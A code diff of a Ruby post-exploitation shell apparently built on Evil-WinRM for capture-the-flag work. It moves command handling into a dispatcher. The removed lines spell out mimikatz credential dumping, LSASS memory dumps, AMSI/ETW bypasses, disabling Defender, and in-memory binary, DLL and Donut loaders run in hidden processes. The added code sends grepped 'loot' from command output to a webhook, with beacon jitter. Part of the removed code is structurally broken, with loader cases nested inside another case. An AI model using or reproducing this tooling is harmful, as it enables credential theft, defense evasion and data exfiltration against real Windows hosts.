@@ -10,6 +10,7 @@ require_relative 'connection'
 require_relative 'utils'
 require_relative 'execution'
 require_relative 'tui'
+require_relative 'command_dispatcher'
 require 'readline'
 require 'timeout'
 require 'evil_ctf/uploader'
@@ -83,7 +84,20 @@ module EvilCTF::Session
     )
     unless conn
       puts "[!] ERROR - Could not create WinRM connection. Check your options and try again."
-      return false
+      return [false, { ok: false, error: 'Could not create connection' }]
+    end
+
+    # Validate connection and capture validation info
+    validation_info = nil
+    begin
+      validation_info = EvilCTF::ConnectionValidator.validate(conn, timeout: 10)
+      if validation_info[:ok]
+        puts "[+] Connection validated: #{validation_info[:hostname]}"
+      else
+        puts "[!] Connection validation failed: #{validation_info[:error]}"
+      end
+    rescue => e
+      validation_info = { ok: false, hostname: nil, error: "Validation error: #{e.message}" }
     end
 
     shell = nil
@@ -124,7 +138,7 @@ module EvilCTF::Session
           EvilCTF::ShellWrapper.exit_session(shell) if defined?(EvilCTF::ShellWrapper.exit_session)
           shell.close if shell
         end
-        return true
+        return [true, validation_info]
       end
 
       # Enumeration presets
@@ -215,329 +229,60 @@ module EvilCTF::Session
               end
             end
 
-            case input
-            when /^help$/i
-              require 'colorize'
-              puts "\n" + "Builtin commands:".colorize(:cyan)
-              help_cmds = [
-                ['help', 'This help'],
-                ['clear', 'Clear screen'],
-                ['tools', 'List tool registry'],
-                ['download_missing', 'Download all missing tools into ./tools'],
-                ['dump_creds', 'Stage mimikatz & dump logon passwords'],
-                ['lsass_dump', 'Stage procdump & dump LSASS to ./loot'],
-                ['enum [type]', 'Run enumeration preset (basic, deep, sql, etc.)'],
-                ['fileops', 'File operations menu (upload/download/ZIP)'],
-                ['bypass-4msi', 'Try AMSI bypass'],
-                ['bypass-etw', 'Full ETW bypass'],
-                ['disable_defender', 'Try disabling Defender real-time'],
-                ['history', 'Show command history'],
-                ['history clear', 'Clear history file'],
-                ['profile save <name>', 'Save current options as profile'],
-                ['get-unquotedservices', 'Show all unquoted service paths'],
-                ['load_ps1 <local_ps1>', 'Upload and load PS1 script'],
-                ['invoke-binary <local_bin> [args]', 'Upload and execute binary'],
-                ['services', 'List services'],
-                ['processes', 'List processes'],
-                ['sysinfo', 'System info'],
-                ['__exit__/exit/quit', 'Exit this Evil-WinRM CTF session'],
-                ['!sh / !bash', 'Spawn local shell']
-              ]
-              help_cmds.each do |cmd, desc|
-                puts "  ".colorize(:light_black) + cmd.colorize(:green) + " - ".colorize(:light_black) + desc.colorize(:white)
+            # Command dispatch via dispatcher
+            dispatch_result = EvilCTF::CommandDispatcher.dispatch(
+              input, 
+              input.split(/\s+/, 2)[1] || '',
+              shell,
+              session_options,
+              command_manager,
+              history
+            )
+
+            if dispatch_result[:handled]
+              # Command was handled by dispatcher
+              if dispatch_result[:ok]
+                puts dispatch_result[:output] if dispatch_result[:output] && !dispatch_result[:output].empty?
+              elsif dispatch_result[:error]
+                puts "[!] #{dispatch_result[:error]}"
               end
-              puts "\n" + "Macros: ".colorize(:cyan) + command_manager.list_macros.join(', ').colorize(:magenta)
-              puts "Aliases: ".colorize(:cyan) + command_manager.list_aliases.join(', ').colorize(:magenta)
-              next
-
-            when /^clear$/i
-              system('clear || cls')
-              next
-
-            when /^tools$/i
-              EvilCTF::Tools.list_available_tools
-              next
-
-            when /^download_missing$/i
-              EvilCTF::Tools.download_missing_tools
-              next
-
-            when /^dump_creds$/i
-              EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
-              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-              command_manager.expand_macro('dump_creds', shell,
-                                           webhook: session_options[:webhook])
-              next
-
-            when /^lsass_dump$/i
-                      # In-memory loader commands
-                      when /^invoke-binary\s+(.+)$/i
-                        args = $1.strip
-                        loader_local = File.expand_path('../../../tools/loaders/Invoke-Binary.ps1', __FILE__)
-                        loader_remote = 'C:\\Users\\Public\\Invoke-Binary.ps1'
-                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
-                          puts "[*] Uploading Invoke-Binary.ps1 loader..."
-                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
-                        end
-                        exe, *exe_args = args.split(/\s+/, 2)
-                        exe_args = exe_args.join(' ')
-                        if File.exist?(exe)
-                          remote_exe = "C:\\Users\\Public\\#{File.basename(exe)}"
-                          puts "[*] Uploading #{exe} to #{remote_exe}..."
-                          EvilCTF::Uploader.upload_file(exe, remote_exe, shell)
-                          exe = remote_exe
-                        end
-                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Invoke-Binary -Path '#{exe}'"
-                        ps += " -Arguments '#{exe_args}'" unless exe_args.empty?
-                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
-                        puts exec_res.output
-                        next
-
-                      when /^dll-loader\s+(.+)$/i
-                        args = $1.strip
-                        loader_local = File.expand_path('../../../tools/loaders/Dll-Loader.ps1', __FILE__)
-                        loader_remote = 'C:\\Users\\Public\\Dll-Loader.ps1'
-                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
-                          puts "[*] Uploading Dll-Loader.ps1 loader..."
-                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
-                        end
-                        dll = args
-                        if File.exist?(dll)
-                          remote_dll = "C:\\Users\\Public\\#{File.basename(dll)}"
-                          puts "[*] Uploading #{dll} to #{remote_dll}..."
-                          EvilCTF::Uploader.upload_file(dll, remote_dll, shell)
-                          dll = remote_dll
-                        end
-                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Dll-Loader -Path '#{dll}'"
-                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
-                        puts exec_res.output
-                        next
-
-                      when /^donut-loader\s+(.+)$/i
-                        args = $1.strip
-                        loader_local = File.expand_path('../../../tools/loaders/Donut-Loader.ps1', __FILE__)
-                        loader_remote = 'C:\\Users\\Public\\Donut-Loader.ps1'
-                        unless shell.run("Test-Path '#{loader_remote}'").output.strip == 'True'
-                          puts "[*] Uploading Donut-Loader.ps1 loader..."
-                          EvilCTF::Uploader.upload_file(loader_local, loader_remote, shell)
-                        end
-                        donutfile, processid = args.split(/\s+/, 2)
-                        if File.exist?(donutfile)
-                          remote_donut = "C:\\Users\\Public\\#{File.basename(donutfile)}"
-                          puts "[*] Uploading #{donutfile} to #{remote_donut}..."
-                          EvilCTF::Uploader.upload_file(donutfile, remote_donut, shell)
-                          donutfile = remote_donut
-                        end
-                        ps = "IEX (Get-Content '#{loader_remote}' -Raw); Donut-Loader -DonutFile '#{donutfile}' -ProcessId #{processid}"
-                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
-                        puts exec_res.output
-                        next
-              EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
-              command_manager.expand_macro('lsass_dump', shell,
-                                           webhook: session_options[:webhook])
-              Uploader.download_file('C:\\Users\\Public\\lsass.dmp',
-                                     "loot/lsass_#{session_options[:ip]}.dmp",
-                                     shell)
-              next
-
-            when /^fileops$/i
-              Uploader.file_operations_menu(shell)
-              next
-
-            when /^enum(?:\s+(\S+))?$/i
-              t = Regexp.last_match(1) || 'basic'
-              if t == 'deep'
-                EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
+            elsif dispatch_result[:ok]
+              # Dispatch returned ok but no output
+            else
+              # Not handled by dispatcher - use legacy path for macros/aliases
+              if command_manager.expand_macro(input, shell,
+                                              webhook: session_options[:webhook])
+                last_command_was_tool_upload = false
+                next
               end
-              if t == 'dom'
-                EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-                EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
-              end
-              if t == 'sql'
-                EvilCTF::SQLEnum.run_sql_enum(shell)
-              else
-                EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache,
-                                               fresh: session_options[:fresh])
-              end
-              next
 
-            when /^dom_enum$/i
-              EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-              EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
-              EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
-                                             fresh: session_options[:fresh])
-              next
-
-            when /^disable_defender$/i
-              EvilCTF::Tools.disable_defender(shell)
-              next
-
-            when /^history$/i
-              history.show
-              next
-
-            when /^history\s+clear$/i
-              history.clear
-              puts '[+] History cleared'
-              next
-
-            when /^profile\s+save\s+(\S+)$/i
-              name = Regexp.last_match(1)
-              EvilCTF::Tools.save_config_profile(name, session_options)
-              next
-
-            when /^get-unquotedservices$/i
-              puts "[*] Getting all unquoted service paths..."
-              unquoted_ps = <<~POWERSHELL
-                Get-CimInstance -Class Win32_Service | Where-Object {
-                  $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
-                } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
-              POWERSHELL
-              exec_res = EvilCTF::Execution.run(shell, unquoted_ps, timeout: 30)
-              puts exec_res.output
-              next
-
-            when /^tool\s+(\w+)$/i
-              key = Regexp.last_match(1)
-              if key == 'all'
-                puts "[*] Staging all tools..."
-                EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
-                  EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
-                end
-              else
-                puts "[*] Staging tool: #{key}"
-                success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
-                if success
-                  puts "[+] Tool '#{key}' staged successfully"
-                  tool = EvilCTF::Tools::TOOL_REGISTRY[key]
-                  if tool && tool[:recommended_remote]
-                    remote_path = tool[:recommended_remote]
-                    case key
-                    when 'mimikatz'
-                      puts "[*] Executing mimikatz..."
-                      ps_cmd = <<~PS
-                        try {
-                          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
-                          $proc.WaitForExit(30000) | Out-Null
-                          if ($proc.HasExited) {
-                            Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
-                          } else {
-                            Write-Output "Mimikatz timed out after 30 seconds"
-                            $proc.Kill()
-                          }
-                        } catch {
-                          Write-Output "Error executing mimikatz: $_.Exception.Message"
-                        }
-                      PS
-                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
-                      puts exec_res.output
-
-                    when 'winpeas'
-                      puts "[*] Executing winpeas..."
-                      ps_cmd = <<~PS
-                        try {
-                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
-                          $proc.WaitForExit(60000) | Out-Null
-                          if ($proc.HasExited) {
-                            Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
-                          } else {
-                            Write-Output "WinPEAS timed out after 60 seconds"
-                            $proc.Kill()
-                          }
-                        } catch {
-                          Write-Output "Error executing winpeas: $_.Exception.Message"
-                        }
-                      PS
-                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 70)
-                      puts exec_res.output
-
-                    when 'procdump'
-                      puts "[*] Executing procdump..."
-                      ps_cmd = <<~PS
-                        try {
-                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
-                          $proc.WaitForExit(30000) | Out-Null
-                          if ($proc.HasExited) {
-                            Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
-                          } else {
-                            Write-Output "Procdump timed out after 30 seconds"
-                            $proc.Kill()
-                          }
-                        } catch {
-                          Write-Output "Error executing procdump: $_.Exception.Message"
-                        }
-                      PS
-                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
-                      puts exec_res.output
-
-                    when 'rubeus', 'seatbelt'
-                      puts "[*] Executing #{key}..."
-                      ps_cmd = <<~PS
-                        try {
-                          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
-                          $proc.WaitForExit(30000) | Out-Null
-                          if ($proc.HasExited) {
-                            Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
-                          } else {
-                            Write-Output "#{key.capitalize} timed out after 30 seconds"
-                            $proc.Kill()
-                          }
-                        } catch {
-                          Write-Output "Error executing #{key}: $_.Exception.Message"
-                        }
-                      PS
-                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
-                      puts exec_res.output
-
-                    when 'inveigh', 'powerview', 'sharphound'
-                      puts "[*] Executing #{key} PowerShell script..."
-                      ps_script = "IEX (Get-Content '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -Raw) 2>&1"
-                      exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
-                      puts exec_res.output
-
-                    when 'socksproxy'
-                      puts "[*] Executing SOCKS proxy PowerShell module..."
-                      ps_script = "Import-Module '#{EvilCTF::Utils.escape_ps_string(remote_path)}' 2>&1; Invoke-SocksProxy -Port 1080"
-                      exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
-                      puts exec_res.output
-
-                    else
-                      if remote_path.end_with?('.exe')
-                        puts "[*] Executing #{key}..."
-                        ps_cmd = <<~PS
-                          try {
-                            $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
-                            $proc.WaitForExit(30000) | Out-Null
-                            if ($proc.HasExited) {
-                              Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
-                            } else {
-                              Write-Output "#{key.capitalize} timed out after 30 seconds"
-                              $proc.Kill()
-                            }
-                          } catch {
-                            Write-Output "Error executing #{key}: $_.Exception.Message"
-                          }
-                        PS
-                        exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
-                        puts exec_res.output
-                      else
-                        puts "[*] Tool staged. Execute manually with: #{remote_path}"
-                      end
-                    end
-                  end
-                else
-                  puts "[-] Failed to stage tool '#{key}'"
+              cmd = command_manager.expand_alias(input)
+              start = Time.now
+              result = shell.run(cmd)
+              elapsed = Time.now - start
+              puts result.output
+              # --- Session Logging: Log output ---
+              if session_logfile
+                File.open(session_logfile, 'a') do |f|
+                  f.puts "[#{Time.now.strftime('%Y-%m-%d %H:%M:%S')}] OUT:"
+                  f.puts result.output
                 end
               end
-              last_command_was_tool_upload = true
+              unless last_command_was_tool_upload
+                matches = EvilCTF::Tools.grep_output(result.output)
+                if matches.any?
+                  EvilCTF::Tools.save_loot(matches)
+                  EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
+                end
+              end
+              last_command_was_tool_upload = false
 
-            when /^!bash$/i, /^!sh$/i
-              puts '[*] Spawning local shell. Type "exit" to return.'
-              system(ENV['SHELL'] || '/bin/bash')
-              next
+              logger.log_command(cmd, result, elapsed,
+                                 '$PID', result.exitcode || 0)
+              sleep(rand(30..90)) if session_options[:beacon]
             end
 
-            # Macro expansion
+              # Macro expansion
 
             if command_manager.expand_macro(input, shell,
                                             webhook: session_options[:webhook])
@@ -631,7 +376,7 @@ module EvilCTF::Session
         retry
       else
         puts "[!] Maximum reconnection attempts reached. Exiting."
-        return false
+        return [false, validation_info]
       end
     ensure
       # Ensure cleanup happens even on interruption or errors
@@ -640,7 +385,7 @@ module EvilCTF::Session
     end
 
     puts '[+] Session closed.'
-    true
+    [true, validation_info]
   end
 
   # ------------------------------------------------------------------
